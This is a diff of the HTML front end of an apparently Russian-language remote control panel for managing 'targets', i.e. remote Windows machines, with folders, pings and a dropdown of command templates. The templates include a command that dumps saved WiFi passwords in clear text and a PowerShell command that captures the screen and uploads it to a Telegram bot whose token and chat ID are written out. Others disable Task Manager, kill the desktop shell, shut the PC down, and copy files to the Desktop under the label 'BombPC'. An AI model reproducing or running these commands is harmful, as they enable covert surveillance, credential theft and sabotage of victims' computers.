@@ -1,13 +1,16 @@
 <!doctype html>
 <html lang="ru">
+
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>⚡ CYBER CONTROL PANEL ⚡</title>
     <link rel="stylesheet" href="./style.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>⚡</text></svg>">
+    <link rel="icon"
+        href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>⚡</text></svg>">
 </head>
+
 <body>
 
     <!-- AUTH SCREEN -->
@@ -32,6 +35,11 @@
 
     <!-- APP SCREEN -->
     <div id="appScreen" class="app hidden">
+        <!-- Mobile Menu Button -->
+        <button id="mobileMenuBtn" class="mobileMenuBtn">
+            <i class="fas fa-bars"></i>
+        </button>
+
         <!-- SIDEBAR MENU -->
         <div class="sidebar">
             <div class="sidebarHeader">
@@ -103,9 +111,12 @@
                     <div class="panelHeader">
                         <div class="title"><i class="fas fa-server"></i> Target List</div>
                         <div class="row">
-                            <button id="btnSelectMode" title="Select multiple targets"><i class="fas fa-check-square"></i> Select</button>
-                            <button id="btnPingAll" title="Ping all targets"><i class="fas fa-satellite-dish"></i> Ping All</button>
-                            <button id="btnRefresh" title="Refresh list"><i class="fas fa-sync-alt"></i> Refresh</button>
+                            <button id="btnSelectMode" title="Select multiple targets"><i
+                                    class="fas fa-check-square"></i> Select</button>
+                            <button id="btnPingAll" title="Ping all targets"><i class="fas fa-satellite-dish"></i> Ping
+                                All</button>
+                            <button id="btnRefresh" title="Refresh list"><i class="fas fa-sync-alt"></i>
+                                Refresh</button>
                         </div>
                     </div>
 
@@ -136,11 +147,12 @@
                         <div class="sortBar">
                             <span class="sortLabel">Сортировка:</span>
                             <div class="sortBtns">
-                                <button class="sortBtn active" data-sort="date"><i class="fas fa-calendar-alt"></i> Дата</button>
-                                <button class="sortBtn" data-sort="name"><i class="fas fa-font"></i> Имя</button>
+                                <button class="sortBtn active" data-sort="date"><i class="fas fa-calendar-alt"></i>
+                                    Дата</button>
                                 <button class="sortBtn" data-sort="online"><i class="fas fa-circle"></i> Онлайн</button>
                                 <button class="sortBtn" data-sort="folder"><i class="fas fa-folder"></i> Папка</button>
-                                <button id="sortDirBtn" class="sortBtn sortDir" title="Направление сортировки"><i class="fas fa-sort-amount-down"></i></button>
+                                <button id="sortDirBtn" class="sortBtn sortDir" title="Направление сортировки"><i
+                                        class="fas fa-sort-amount-down"></i></button>
                             </div>
                         </div>
 
@@ -149,7 +161,8 @@
                             <span class="sortLabel">Папка:</span>
                             <div class="sortBtns" id="folderFilterBtns">
                                 <button class="sortBtn folderFilterBtn active" data-folder="all">Все</button>
-                                <button class="sortBtn folderFilterBtn" data-folder="__none__"><i class="fas fa-inbox"></i> Без папки</button>
+                                <button class="sortBtn folderFilterBtn" data-folder="__none__"><i
+                                        class="fas fa-inbox"></i> Без папки</button>
                             </div>
                         </div>
 
@@ -161,7 +174,8 @@
                     <!-- MULTI-SELECT TOOLBAR -->
                     <div id="multiSelectBar" class="multiSelectBar hidden">
                         <span id="multiSelectCount" class="badge">0 выбрано</span>
-                        <button id="btnMoveToFolder" class="btnPrimary"><i class="fas fa-folder-arrow-up"></i> Переместить в папку</button>
+                        <button id="btnMoveToFolder" class="btnPrimary"><i class="fas fa-folder-arrow-up"></i>
+                            Переместить в папку</button>
                         <button id="btnRemoveFromFolder"><i class="fas fa-folder-minus"></i> Убрать из папки</button>
                         <button id="btnCancelSelect">Отмена</button>
                     </div>
@@ -250,24 +264,49 @@
                                 <option value="">Выберите шаблон...</option>
                                 <option value='shutdown /s /t 0'>PCOFF</option>
                                 <option value='rundll32.exe user32.dll,LockWorkStation'>LockPC</option>
-                                <option value='xcopy "C:\Windows\Globalization\Sorting" "%USERPROFILE%\Desktop\Globalization" /E /I /H /K'>BombPC</option>
+                                <option
+                                    value='xcopy "C:\Windows\Globalization\Sorting" "%USERPROFILE%\Desktop\Globalization" /E /I /H /K'>
+                                    BombPC</option>
                                 <option value='start https://www.youtube.com/@bibonuwu'>OpenMyTube</option>
                                 <option value='tracert google.com'>TrackIP</option>
-                                <option value='powershell -Command "Invoke-RestMethod https://ipinfo.io/json"'>InfoIP</option>
+                                <option value='powershell -Command "Invoke-RestMethod https://ipinfo.io/json"'>InfoIP
+                                </option>
                                 <option value='start https://www.google.com'>Open Website</option>
-                                <option value='echo 127.0.0.1 www.example.com >> "%SystemRoot%\System32\drivers\etc\hosts"'>Block Website</option>
-                                <option value="powershell -Command &quot;Add-Type -AssemblyName System.Speech; $s = New-Object System.Speech.Synthesis.SpeechSynthesizer; $s.Speak('Hello World')&quot;">Text To Speech</option>
-                                <option value="powershell -Command &quot;Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Hello World', 'Message Box')&quot;">MessageBox</option>
-                                <option value="REG add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f">Task Manager ON</option>
-                                <option value="REG add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f">Task Manager OFF</option>
-                                <option value="REG add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v SettingsPageVisibility /t REG_DWORD /d 1 /f">Settings ON</option>
-                                <option value="REG delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v SettingsPageVisibility /f">Settings OFF</option>
+                                <option
+                                    value='echo 127.0.0.1 www.example.com >> "%SystemRoot%\System32\drivers\etc\hosts"'>
+                                    Block Website</option>
+                                <option
+                                    value="powershell -Command &quot;Add-Type -AssemblyName System.Speech; $s = New-Object System.Speech.Synthesis.SpeechSynthesizer; $s.Speak('Hello World')&quot;">
+                                    Text To Speech</option>
+                                <option
+                                    value="powershell -Command &quot;Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Hello World', 'Message Box')&quot;">
+                                    MessageBox</option>
+                                <option
+                                    value="REG add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f">
+                                    Task Manager ON</option>
+                                <option
+                                    value="REG add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f">
+                                    Task Manager OFF</option>
+                                <option
+                                    value="REG add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v SettingsPageVisibility /t REG_DWORD /d 1 /f">
+                                    Settings ON</option>
+                                <option
+                                    value="REG delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v SettingsPageVisibility /f">
+                                    Settings OFF</option>
                                 <option value="start explorer.exe">Explorer ON</option>
                                 <option value="taskkill /im explorer.exe /f /t">Explorer OFF</option>
-                                <option value="powershell -NoProfile -ExecutionPolicy Bypass -Command &quot;Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Scope CurrentUser -Force; Install-Module -Name AudioDeviceCmdlets -Scope CurrentUser -Force -Confirm:$false&quot;">Install Audio Tools</option>
-                                <option value="powershell -NoProfile -Command &quot;Import-Module AudioDeviceCmdlets; Set-AudioDevice -PlaybackVolume 100&quot;">Max Volume</option>
-                                <option value="for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear">WiFi Passwords</option>
-                                <option value="powershell -NoProfile -Command &quot;$file = Join-Path $env:TEMP 'screen.png'; Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height; $g = [System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size); $bmp.Save($file, [System.Drawing.Imaging.ImageFormat]::Png); &amp; curl.exe -F 'chat_id=1005333334' -F ('photo=@' + $file) 'https://api.telegram.org/bot7325932397:AAGYcJAyNxZPXC4Uw3rvzzrYP-6ionuD4Nw/sendPhoto'&quot;">Get screenshot</option>
+                                <option
+                                    value="powershell -NoProfile -ExecutionPolicy Bypass -Command &quot;Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Scope CurrentUser -Force; Install-Module -Name AudioDeviceCmdlets -Scope CurrentUser -Force -Confirm:$false&quot;">
+                                    Install Audio Tools</option>
+                                <option
+                                    value="powershell -NoProfile -Command &quot;Import-Module AudioDeviceCmdlets; Set-AudioDevice -PlaybackVolume 100&quot;">
+                                    Max Volume</option>
+                                <option
+                                    value="for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear">
+                                    WiFi Passwords</option>
+                                <option
+                                    value="powershell -NoProfile -Command &quot;$file = Join-Path $env:TEMP 'screen.png'; Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height; $g = [System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size); $bmp.Save($file, [System.Drawing.Imaging.ImageFormat]::Png); &amp; curl.exe -F 'chat_id=1005333334' -F ('photo=@' + $file) 'https://api.telegram.org/bot7325932397:AAGYcJAyNxZPXC4Uw3rvzzrYP-6ionuD4Nw/sendPhoto'&quot;">
+                                    Get screenshot</option>
                             </select>
                             <input id="cmdInput" placeholder='Введите команду или выберите шаблон...' />
                             <button id="btnCmdSend" class="btnPrimary">Отправить команду</button>
@@ -286,7 +325,8 @@
                     <div class="panelHeader">
                         <div class="title"><i class="fas fa-folder-tree"></i> Управление папками</div>
                         <div class="row">
-                            <button id="btnCreateRootFolder" class="btnPrimary"><i class="fas fa-folder-plus"></i> Создать папку</button>
+                            <button id="btnCreateRootFolder" class="btnPrimary"><i class="fas fa-folder-plus"></i>
+                                Создать папку</button>
                             <span id="foldersCountBadge" class="badge">0 папок</span>
                         </div>
                     </div>
@@ -343,4 +383,5 @@
 
     <script type="module" src="./main.js"></script>
 </body>
+
 </html>
